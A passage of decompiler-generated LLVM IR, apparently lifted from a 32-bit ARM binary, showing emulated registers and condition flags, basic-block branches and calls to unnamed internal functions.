  %v1_8c18 = and i32 %v3_8c10, 33554432
  %v2_8c18 = icmp ne i32 %v1_8c18, 0
  store i1 %v2_8c18, i1* %cpsr_c.global-to-local, align 1
  %v3_8c18 = mul i32 %v3_8c10, 128
  %v1_8c1c = add i32 %v3_8c18, 1472
  %v2_8c20 = add i32 %v2_8c08, %stack_var_-20856.0.ph
  store i32 %v2_8c20, i32* @r0, align 4
  %v0_8c24 = load i32, i32* @r7, align 4
  %v2_8c24 = add i32 %v1_8c1c, %v0_8c24
  store i32 %v2_8c24, i32* %r1.global-to-local, align 4
  %v2_8c28 = inttoptr i32 %v2_8c20 to i8*
  %v3_8c28 = call i32 @function_12504(i8* %v2_8c28, i32 %v2_8c24)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c30 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15770.38 to i32), i32* %r1.global-to-local, align 4
  %v2_8c3c = add i32 %v2_8c30, %stack_var_-20856.0.ph
  store i32 %v2_8c3c, i32* @r0, align 4
  %v3_8c40 = inttoptr i32 %v2_8c3c to i8*
  %v4_8c40 = call i32 @function_12504(i8* %v3_8c40, i32 ptrtoint ([3 x i8]* @global_var_15770.38 to i32))
  store i32 %v4_8c40, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  %v3_8c48 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_8c48, i32* %r3.global-to-local, align 4
  %v0_8c4c = load i32, i32* @r6, align 4
  %v1_8c4c = add i32 %v0_8c4c, 37
  %v2_8c4c = inttoptr i32 %v1_8c4c to i32*
  %v3_8c4c = load i32, i32* %v2_8c4c, align 4
  store i32 %v3_8c4c, i32* %r2.global-to-local, align 4
  %v1_8c50 = add i32 %v3_8c48, 1
  store i32 %v1_8c50, i32* %ip.global-to-local, align 4
  %v2_8c54 = sub i32 %v3_8c4c, %v1_8c50
  %v3_8c54 = icmp uge i32 %v3_8c4c, %v1_8c50
  store i1 %v3_8c54, i1* %cpsr_c.global-to-local, align 1
  %v4_8c54 = xor i32 %v3_8c4c, %v1_8c50
  %v5_8c54 = xor i32 %v2_8c54, %v3_8c4c
  %v6_8c54 = and i32 %v5_8c54, %v4_8c54
  %v7_8c54 = icmp slt i32 %v6_8c54, 0
  store i1 %v7_8c54, i1* %cpsr_v.global-to-local, align 1
  %v8_8c54 = icmp slt i32 %v2_8c54, 0
  store i1 %v8_8c54, i1* %cpsr_n.global-to-local, align 1
  %v9_8c54 = icmp eq i32 %v3_8c4c, %v1_8c50
  store i1 %v9_8c54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8c50, i32* %stack_var_-40, align 4
  %v8_8c5c = icmp sgt i32 %v3_8c4c, %v1_8c50
  br i1 %v8_8c5c, label %dec_label_pc_8c04, label %dec_label_pc_8c60

dec_label_pc_8c60:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8bd8
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c64 = call i32 @function_124dc(i8* %v1_8940)
  %v2_8c6c = add i32 %v2_8c64, %stack_var_-20856.0.ph
  store i32 %v2_8c6c, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  %v3_8c74 = inttoptr i32 %v2_8c6c to i8*
  %v4_8c74 = call i32 @function_12504(i8* %v3_8c74, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32))
  store i32 %v4_8c74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c78

dec_label_pc_8c78:                                ; preds = %dec_label_pc_8bcc, %dec_label_pc_8c60
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c7c = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8c88 = add i32 %v2_8c7c, %stack_var_-20856.0.ph
  store i32 %v2_8c88, i32* @r0, align 4
  %v3_8c8c = inttoptr i32 %v2_8c88 to i8*
  %v4_8c8c = call i32 @function_12504(i8* %v3_8c8c, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32))
  store i32 %v4_8c8c, i32* %r0.global-to-local, align 4
  store i32 %v6_8200, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_8c94, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_8c94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c94, label %dec_label_pc_8cb4, label %dec_label_pc_8c9c

dec_label_pc_8c9c:                                ; preds = %dec_label_pc_8c78
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ca0 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v6_8200, i32* %r1.global-to-local, align 4
  %v2_8cac = add i32 %v2_8ca0, %stack_var_-20856.0.ph
  store i32 %v2_8cac, i32* @r0, align 4
  %v2_8cb0 = inttoptr i32 %v2_8cac to i8*
  %v3_8cb0 = call i32 @function_12504(i8* %v2_8cb0, i32 %v6_8200)
  store i32 %v3_8cb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8cb4

dec_label_pc_8cb4:                                ; preds = %dec_label_pc_8c78, %dec_label_pc_8c9c
  %v0_8cb4 = load i32, i32* @r7, align 4
  %v1_8cb4 = add i32 %v0_8cb4, 1440
  store i32 %v1_8cb4, i32* %r4.global-to-local, align 4
  %v0_8cb8 = load i32, i32* @r6, align 4
  store i32 %v0_8cb8, i32* %r0.global-to-local, align 4
  store i32 %v1_8cb4, i32* %r1.global-to-local, align 4
  %v2_8cc0 = inttoptr i32 %v0_8cb8 to i8*
  %v3_8cc0 = call i32 @function_128bc(i8* %v2_8cc0, i32 %v1_8cb4)
  store i32 %v3_8cc0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8cc4 = icmp slt i32 %v3_8cc0, 0
  store i1 %v1_8cc4, i1* %cpsr_n.global-to-local, align 1
  %v2_8cc4 = icmp eq i32 %v3_8cc0, 0
  store i1 %v2_8cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8cc4, label %dec_label_pc_960c, label %dec_label_pc_8ccc

dec_label_pc_8ccc:                                ; preds = %dec_label_pc_8cb4, %dec_label_pc_960c
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_8cd0 = load i32, i32* @r6, align 4
  %v1_8cd0 = add i32 %v0_8cd0, -1431
  %v2_8cd0 = inttoptr i32 %v1_8cd0 to i32*
  %v3_8cd0 = load i32, i32* %v2_8cd0, align 4
  store i32 %v3_8cd0, i32* @r4, align 4
  %v2_8cd4 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_8cd4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8ce4 = load i32, i32* @r4, align 4
  store i32 %v0_8ce4, i32* %r0.global-to-local, align 4
  %v5_8ce8 = call i32 @function_13700(i32 %v0_8ce4, i32* %v4_8ce8, i32 %v2_8cd4, i32 16384)
  store i32 %v5_8ce8, i32* %r0.global-to-local, align 4
  %v0_8cec = load i32, i32* @r6, align 4
  %v1_8cec = add i32 %v0_8cec, -1431
  %v2_8cec = inttoptr i32 %v1_8cec to i32*
  %v3_8cec = load i32, i32* %v2_8cec, align 4
  store i32 %v3_8cec, i32* %r0.global-to-local, align 4
  %v3_8cf4 = udiv i32 %v3_8cec, 32
  %v3_8cf8 = mul nuw nsw i32 %v3_8cf4, 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  %v2_8d00 = add i32 %v3_8cf8, %v2_8748
  store i32 %v2_8d00, i32* %r3.global-to-local, align 4
  %v1_8d04 = add i32 %v2_8d00, -164
  %v2_8d04 = inttoptr i32 %v1_8d04 to i32*
  %v3_8d04 = load i32, i32* %v2_8d04, align 4
  %v1_8d08 = urem i32 %v3_8cec, 32
  %v1_8d0c = load i32, i32* %fp.global-to-local, align 4
  %v7_8d0c = shl i32 %v1_8d0c, %v1_8d08
  %v8_8d0c = or i32 %v7_8d0c, %v3_8d04
  store i32 %v8_8d0c, i32* %r2.global-to-local, align 4
  %v0_8d10 = load i32, i32* @sl, align 4
  %v2_8d10 = sub i32 %v0_8d10, %v3_8cec
  %v3_8d10 = icmp uge i32 %v0_8d10, %v3_8cec
  store i1 %v3_8d10, i1* %cpsr_c.global-to-local, align 1
  %v4_8d10 = xor i32 %v0_8d10, %v3_8cec
  %v5_8d10 = xor i32 %v2_8d10, %v0_8d10
  %v6_8d10 = and i32 %v5_8d10, %v4_8d10
  %v7_8d10 = icmp slt i32 %v6_8d10, 0
  store i1 %v7_8d10, i1* %cpsr_v.global-to-local, align 1
  %v8_8d10 = icmp slt i32 %v2_8d10, 0
  store i1 %v8_8d10, i1* %cpsr_n.global-to-local, align 1
  %v9_8d10 = icmp eq i32 %v0_8d10, %v3_8cec
  store i1 %v9_8d10, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r1.global-to-local, align 4
  store i32 %v8_8d0c, i32* %v2_8d04, align 4
  %v0_8d1c = load i32, i32* %sb.global-to-local, align 4
  %v1_8d1c = load i32, i32* @r6, align 4
  %v2_8d1c = add i32 %v1_8d1c, -1419
  %v3_8d1c = inttoptr i32 %v2_8d1c to i32*
  store i32 %v0_8d1c, i32* %v3_8d1c, align 4
  %v0_8d20 = load i32, i32* %r1.global-to-local, align 4
  %v1_8d20 = trunc i32 %v0_8d20 to i8
  %v2_8d20 = load i32, i32* @r6, align 4
  %v3_8d20 = add i32 %v2_8d20, -1427
  %v4_8d20 = inttoptr i32 %v3_8d20 to i8*
  store i8 %v1_8d20, i8* %v4_8d20, align 1
  %v0_8d24 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_8d24 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_8d24 = xor i1 %v0_8d24, %v1_8d24
  br i1 %v2_8d24, label %dec_label_pc_8d28, label %dec_label_pc_8630

dec_label_pc_8d28:                                ; preds = %dec_label_pc_8ccc
  %v0_8d28 = load i32, i32* %r0.global-to-local, align 4
  %v1_8d28 = add i32 %v0_8d28, 1
  store i32 %v1_8d28, i32* @sl, align 4
  br label %dec_label_pc_876c

dec_label_pc_8d30:                                ; preds = %dec_label_pc_8608
  %v1_8d30 = add i32 %v3_8900, -1431
  %v2_8d30 = inttoptr i32 %v1_8d30 to i32*
  %v3_8d30 = load i32, i32* %v2_8d30, align 4
  store i32 %v3_8d30, i32* %r0.global-to-local, align 4
  %v3_8d38 = udiv i32 %v3_8d30, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8d3c = mul nuw nsw i32 %v3_8d38, 4
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v2_8d44 = add i32 %v3_8d3c, %v2_8748
  store i32 %v2_8d44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d48

dec_label_pc_8d48:                                ; preds = %.thread24, %.thread35, %dec_label_pc_8d30
  %v1_8d54 = phi i32 [ %v4_85ec, %.thread35 ], [ %v4_85cc, %.thread24 ], [ %v3_8d30, %dec_label_pc_8d30 ]
  %v1_8d58 = phi i32 [ %v3_8600, %.thread35 ], [ %v3_85e0, %.thread24 ], [ %v2_8d44, %dec_label_pc_8d30 ]
  %v1_8d48 = add i32 %v1_8d58, -164
  %v2_8d48 = inttoptr i32 %v1_8d48 to i32*
  %v3_8d48 = load i32, i32* %v2_8d48, align 4
  %v1_8d4c = urem i32 %v1_8d54, 32
  store i32 %v1_8d4c, i32* %r1.global-to-local, align 4
  %v1_8d50 = load i32, i32* %fp.global-to-local, align 4
  %v7_8d50 = shl i32 %v1_8d50, %v1_8d4c
  %v8_8d50 = or i32 %v7_8d50, %v3_8d48
  store i32 %v8_8d50, i32* %r2.global-to-local, align 4
  %v0_8d54 = load i32, i32* @sl, align 4
  %v2_8d54 = sub i32 %v0_8d54, %v1_8d54
  %v3_8d54 = icmp uge i32 %v0_8d54, %v1_8d54
  store i1 %v3_8d54, i1* %cpsr_c.global-to-local, align 1
  %v4_8d54 = xor i32 %v0_8d54, %v1_8d54
  %v5_8d54 = xor i32 %v2_8d54, %v0_8d54
  %v6_8d54 = and i32 %v5_8d54, %v4_8d54
  %v7_8d54 = icmp slt i32 %v6_8d54, 0
  store i1 %v7_8d54, i1* %cpsr_v.global-to-local, align 1
  %v8_8d54 = icmp slt i32 %v2_8d54, 0
  store i1 %v8_8d54, i1* %cpsr_n.global-to-local, align 1
  %v9_8d54 = icmp eq i32 %v0_8d54, %v1_8d54
  store i1 %v9_8d54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8d50, i32* %v2_8d48, align 4
  %v2_8d5c = xor i1 %v8_8d54, %v7_8d54
  br i1 %v2_8d5c, label %dec_label_pc_8d60, label %dec_label_pc_8630

dec_label_pc_8d60:                                ; preds = %dec_label_pc_8d48
  %v0_8d60 = load i32, i32* %r0.global-to-local, align 4
  %v1_8d60 = add i32 %v0_8d60, 1
  store i32 %v1_8d60, i32* @sl, align 4
  br label %dec_label_pc_876c

dec_label_pc_8d68:                                ; preds = %dec_label_pc_85b8
  %v1_8d68 = add i32 %v3_8900, -1423
  %v2_8d68 = inttoptr i32 %v1_8d68 to i32*
  %v3_8d68 = load i32, i32* %v2_8d68, align 4
  %v1_8d6c = load i32, i32* %sb.global-to-local, align 4
  %v2_8d6c = sub i32 %v1_8d6c, %v3_8d68
  store i32 %v2_8d6c, i32* %r3.global-to-local, align 4
  %v1_8d70 = add i32 %v2_8d6c, -30
  %v2_8d70 = icmp ugt i32 %v2_8d6c, 29
  store i1 %v2_8d70, i1* %cpsr_c.global-to-local, align 1
  %v3_8d70 = sub i32 29, %v2_8d6c
  %v4_8d70 = and i32 %v3_8d70, %v2_8d6c
  %v5_8d70 = icmp slt i32 %v4_8d70, 0
  store i1 %v5_8d70, i1* %cpsr_v.global-to-local, align 1
  %v6_8d70 = icmp slt i32 %v1_8d70, 0
  store i1 %v6_8d70, i1* %cpsr_n.global-to-local, align 1
  %v7_8d70 = icmp eq i32 %v2_8d6c, 30
  store i1 %v7_8d70, i1* %cpsr_z.global-to-local, align 1
  %v2_8d74 = xor i1 %v7_8d70, true
  %v3_8d74 = and i1 %v2_8d70, %v2_8d74
  br i1 %v3_8d74, label %dec_label_pc_8618, label %dec_label_pc_8d78

dec_label_pc_8d78:                                ; preds = %dec_label_pc_8d68
  %v1_8d78 = add i32 %v3_8900, -1431
  %v2_8d78 = inttoptr i32 %v1_8d78 to i32*
  %v3_8d78 = load i32, i32* %v2_8d78, align 4
  store i32 %v3_8d78, i32* %r0.global-to-local, align 4
  %v3_8d80 = udiv i32 %v3_8d78, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8d84 = mul nuw nsw i32 %v3_8d80, 4
  store i32 %v3_8d84, i32* %r3.global-to-local, align 4
  store i32 %v2_8748, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_8750

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_881c
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_8dd8 = call i32 @function_1257c(i32 %v2_8280, i32 10240)
  store i32 %v2_8dd8, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_8de4 = load i32, i32* @r8, align 4
  %v1_8de4 = add i32 %v0_8de4, -1456
  %v2_8de4 = inttoptr i32 %v1_8de4 to i32*
  %v3_8de4 = load i32, i32* %v2_8de4, align 4
  store i32 %v3_8de4, i32* %r0.global-to-local, align 4
  store i32 %v2_8280, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v5_8df0 = call i32 @function_136a0(i32 %v3_8de4, i32* nonnull %stack_var_-20809, i32 10240, i32 16386)
  store i32 %v5_8df0, i32* %r0.global-to-local, align 4
  store i32 %v5_8df0, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8df8 = icmp slt i32 %v5_8df0, 0
  store i1 %v1_8df8, i1* %cpsr_n.global-to-local, align 1
  %v2_8df8 = icmp eq i32 %v5_8df0, 0
  store i1 %v2_8df8, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  %tmp210 = icmp slt i32 %v5_8df0, 1
  br i1 %tmp210, label %dec_label_pc_9a7c, label %dec_label_pc_8e04

dec_label_pc_8e04:                                ; preds = %dec_label_pc_8dd0
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  store i32 %v5_8df0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15774.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_8e14 = call i32 @function_125a0(i32 %v2_8280, i32 %v5_8df0, i32 ptrtoint ([5 x i8]* @global_var_15774.40 to i32), i32 4)
  store i32 %v5_8e14, i32* %r0.global-to-local, align 4
  %v1_8e18 = add i32 %v5_8e14, 1
  %v2_8e18 = icmp eq i32 %v5_8e14, -1
  store i1 %v2_8e18, i1* %cpsr_c.global-to-local, align 1
  %v3_8e18 = sub i32 0, %v5_8e14
  %v4_8e18 = and i32 %v1_8e18, %v3_8e18
  %v5_8e18 = icmp slt i32 %v4_8e18, 0
  store i1 %v5_8e18, i1* %cpsr_v.global-to-local, align 1
  %v6_8e18 = icmp slt i32 %v1_8e18, 0
  store i1 %v6_8e18, i1* %cpsr_n.global-to-local, align 1
  %v7_8e18 = icmp eq i32 %v1_8e18, 0
  store i1 %v7_8e18, i1* %cpsr_z.global-to-local, align 1
  %v0_9914 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v7_8e18, label %dec_label_pc_9914, label %dec_label_pc_8e20

dec_label_pc_8e20:                                ; preds = %dec_label_pc_8e04, %dec_label_pc_9914
  store i32 ptrtoint ([5 x i8]* @global_var_15774.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v0_9914, i32* %r1.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v5_8e30 = call i32 @function_125a0(i32 %v2_8280, i32 %v0_9914, i32 ptrtoint ([5 x i8]* @global_var_15774.40 to i32), i32 4)
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v2_8e3c = add i32 %v5_8e30, %v2_8748
  store i32 %v2_8e3c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v3_8e44 = load i32, i32* @r6, align 4
  %v4_8e44 = add i32 %v3_8e44, %v2_8e3c
  %v5_8e44 = inttoptr i32 %v4_8e44 to i8*
  store i8 0, i8* %v5_8e44, align 1
  %v0_8e48 = load i32, i32* @r5, align 4
  store i32 %v0_8e48, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_8e50 = inttoptr i32 %v0_8e48 to i32*
  %v3_8e50 = call i32 @function_11b24(i32 46, i32* %v2_8e50)
  %v0_8e54 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8e54, i32* @r1, align 4
  store i32 %v3_8e50, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8e60 = call i32 @function_12830(i8* %tmp199, i32 %v0_8e54, i32 %v3_8e50)
  store i32 %v4_8e60, i32* %r0.global-to-local, align 4
  %v1_8e64 = add i32 %v4_8e60, 1
  %v2_8e64 = icmp eq i32 %v4_8e60, -1
  store i1 %v2_8e64, i1* %cpsr_c.global-to-local, align 1
  %v3_8e64 = sub i32 0, %v4_8e60
  %v4_8e64 = and i32 %v1_8e64, %v3_8e64
  %v5_8e64 = icmp slt i32 %v4_8e64, 0
  store i1 %v5_8e64, i1* %cpsr_v.global-to-local, align 1
  %v6_8e64 = icmp slt i32 %v1_8e64, 0
  store i1 %v6_8e64, i1* %cpsr_n.global-to-local, align 1
  %v7_8e64 = icmp eq i32 %v1_8e64, 0
  store i1 %v7_8e64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e64, label %.thread45, label %bb211

bb211:                                            ; preds = %dec_label_pc_8e20
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_8e6c = load i32, i32* @r8, align 4
  %v3_8e6c = add i32 %v2_8e6c, -4
  %v4_8e6c = inttoptr i32 %v3_8e6c to i32*
  store i32 2, i32* %v4_8e6c, align 4
  br label %.thread45

.thread45:                                        ; preds = %dec_label_pc_8e20, %bb211
  %v0_8e70 = load i32, i32* @r5, align 4
  store i32 %v0_8e70, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_8e78 = inttoptr i32 %v0_8e70 to i32*
  %v3_8e78 = call i32 @function_11b24(i32 45, i32* %v2_8e78)
  %v0_8e7c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8e7c, i32* @r1, align 4
  store i32 %v3_8e78, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8e88 = call i32 @function_12830(i8* %tmp199, i32 %v0_8e7c, i32 %v3_8e78)
  store i32 %v4_8e88, i32* %r0.global-to-local, align 4
  %v1_8e8c = add i32 %v4_8e88, 1
  %v2_8e8c = icmp eq i32 %v4_8e88, -1
  store i1 %v2_8e8c, i1* %cpsr_c.global-to-local, align 1
  %v3_8e8c = sub i32 0, %v4_8e88
  %v4_8e8c = and i32 %v1_8e8c, %v3_8e8c
  %v5_8e8c = icmp slt i32 %v4_8e8c, 0
  store i1 %v5_8e8c, i1* %cpsr_v.global-to-local, align 1
  %v6_8e8c = icmp slt i32 %v1_8e8c, 0
  store i1 %v6_8e8c, i1* %cpsr_n.global-to-local, align 1
  %v7_8e8c = icmp eq i32 %v1_8e8c, 0
  store i1 %v7_8e8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e8c, label %.thread46, label %bb212

bb212:                                            ; preds = %.thread45
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_8e94 = load i32, i32* @r8, align 4
  %v3_8e94 = add i32 %v2_8e94, -4
  %v4_8e94 = inttoptr i32 %v3_8e94 to i32*
  store i32 1, i32* %v4_8e94, align 4
  br label %.thread46

.thread46:                                        ; preds = %.thread45, %bb212
  %v0_8e98 = load i32, i32* @r5, align 4
  store i32 %v0_8e98, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_8ea0 = load i32, i32* @r8, align 4
  %v2_8ea0 = inttoptr i32 %v1_8ea0 to i32*
  store i32 %v0_8e98, i32* %v2_8ea0, align 4
  %v2_8ea4 = inttoptr i32 %v0_8e98 to i32*
  %v3_8ea4 = call i32 @function_11b24(i32 44, i32* %v2_8ea4)
  %v0_8ea8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8ea8, i32* @r1, align 4
  store i32 %v3_8ea4, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8eb4 = call i32 @function_12830(i8* %tmp199, i32 %v0_8ea8, i32 %v3_8ea4)
  store i32 %v4_8eb4, i32* %r0.global-to-local, align 4
  %v1_8eb8 = add i32 %v4_8eb4, 1
  %v2_8eb8 = icmp eq i32 %v4_8eb4, -1
  store i1 %v2_8eb8, i1* %cpsr_c.global-to-local, align 1
  %v3_8eb8 = sub i32 0, %v4_8eb4
  %v4_8eb8 = and i32 %v1_8eb8, %v3_8eb8
  %v5_8eb8 = icmp slt i32 %v4_8eb8, 0
  store i1 %v5_8eb8, i1* %cpsr_v.global-to-local, align 1
  %v6_8eb8 = icmp slt i32 %v1_8eb8, 0
  store i1 %v6_8eb8, i1* %cpsr_n.global-to-local, align 1
  %v7_8eb8 = icmp eq i32 %v1_8eb8, 0
  store i1 %v7_8eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8eb8, label %.thread47, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %.thread46
  %v0_8ec0 = load i32, i32* @r5, align 4
  store i32 %v0_8ec0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_8ec8 = inttoptr i32 %v0_8ec0 to i32*
  %v3_8ec8 = call i32 @function_11b24(i32 44, i32* %v2_8ec8)
  %v0_8ecc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8ecc, i32* @r1, align 4
  store i32 %v3_8ec8, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8ed8 = call i32 @function_12830(i8* %tmp199, i32 %v0_8ecc, i32 %v3_8ec8)
  store i32 %v4_8ed8, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  %v2_8ee4 = add i32 %v4_8ed8, %v2_8748
  store i32 %v2_8ee4, i32* %r3.global-to-local, align 4
  %v1_8ee8 = load i32, i32* @r6, align 4
  %v2_8ee8 = add i32 %v1_8ee8, %v2_8ee4
  %v3_8ee8 = inttoptr i32 %v2_8ee8 to i8*
  %v4_8ee8 = load i8, i8* %v3_8ee8, align 1
  %v2_8ef0 = icmp ugt i8 %v4_8ee8, 31
  store i1 %v2_8ef0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8ef0 = icmp ult i8 %v4_8ee8, 32
  store i1 %v6_8ef0, i1* %cpsr_n.global-to-local, align 1
  %v7_8ef0 = icmp eq i8 %v4_8ee8, 32
  store i1 %v7_8ef0, i1* %cpsr_z.global-to-local, align 1
  %v2_8ef8 = zext i1 %v7_8ef0 to i32
  %v2_8ef8.v4_8ed8 = add i32 %v2_8ef8, %v4_8ed8
  store i32 %v2_8ef8.v4_8ed8, i32* @r4, align 4
  %v2_8efc = add i32 %v2_8ef8.v4_8ed8, %v2_8280
  store i32 %v2_8efc, i32* @r6, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8efc, i32* %r0.global-to-local, align 4
  %v1_8f08 = load i32, i32* %fp.global-to-local, align 4
  %v2_8f08 = sub i32 %v1_8f08, %v2_8ef8.v4_8ed8
  store i32 %v2_8f08, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8f10 = call i32 @function_125a0(i32 %v2_8efc, i32 %v2_8f08, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32 2)
  store i32 %v5_8f10, i32* %r0.global-to-local, align 4
  %v1_8f14 = add i32 %v5_8f10, 1
  %v2_8f14 = icmp eq i32 %v5_8f10, -1
  store i1 %v2_8f14, i1* %cpsr_c.global-to-local, align 1
  %v3_8f14 = sub i32 0, %v5_8f10
  %v4_8f14 = and i32 %v1_8f14, %v3_8f14
  %v5_8f14 = icmp slt i32 %v4_8f14, 0
  store i1 %v5_8f14, i1* %cpsr_v.global-to-local, align 1
  %v6_8f14 = icmp slt i32 %v1_8f14, 0
  store i1 %v6_8f14, i1* %cpsr_n.global-to-local, align 1
  %v7_8f14 = icmp eq i32 %v1_8f14, 0
  store i1 %v7_8f14, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_8f10, i32* %r2.global-to-local, align 4
  br i1 %v7_8f14, label %.thread47, label %dec_label_pc_8f20

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8ec0
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v1_8f28 = load i32, i32* @r4, align 4
  %v2_8f28 = add i32 %v1_8f28, %v2_8748
  %v1_8f2c = add i32 %v5_8f10, -1
  %v2_8f2c = icmp ne i32 %v5_8f10, 0
  store i1 %v2_8f2c, i1* %cpsr_c.global-to-local, align 1
  %v3_8f2c = sub i32 0, %v5_8f10
  %v4_8f2c = and i32 %v5_8f10, %v3_8f2c
  %v5_8f2c = icmp slt i32 %v4_8f2c, 0
  store i1 %v5_8f2c, i1* %cpsr_v.global-to-local, align 1
  %v6_8f2c = icmp slt i32 %v1_8f2c, 0
  store i1 %v6_8f2c, i1* %cpsr_n.global-to-local, align 1
  %v7_8f2c = icmp eq i32 %v5_8f10, 1
  store i1 %v7_8f2c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f30 = add i32 %v2_8f28, -20736
  store i32 %v1_8f30, i32* %r3.global-to-local, align 4
  %v7_8f34 = icmp sgt i32 %v5_8f10, 1
  br i1 %v7_8f34, label %bb213, label %bb214

bb213:                                            ; preds = %dec_label_pc_8f20
  %v9_8f34 = add i32 %v5_8f10, -2
  store i32 %v9_8f34, i32* %r2.global-to-local, align 4
  br label %bb214

bb214:                                            ; preds = %dec_label_pc_8f20, %bb213
  %v3_8f3c = phi i32 [ %v5_8f10, %dec_label_pc_8f20 ], [ %v9_8f34, %bb213 ]
  %v1_8f38 = add i32 %v2_8f28, -20773
  store i32 %v1_8f38, i32* %r3.global-to-local, align 4
  %v0_8f3c = load i32, i32* @r5, align 4
  %v1_8f3c = trunc i32 %v0_8f3c to i8
  %v4_8f3c = add i32 %v3_8f3c, %v1_8f38
  %v5_8f3c = inttoptr i32 %v4_8f3c to i8*
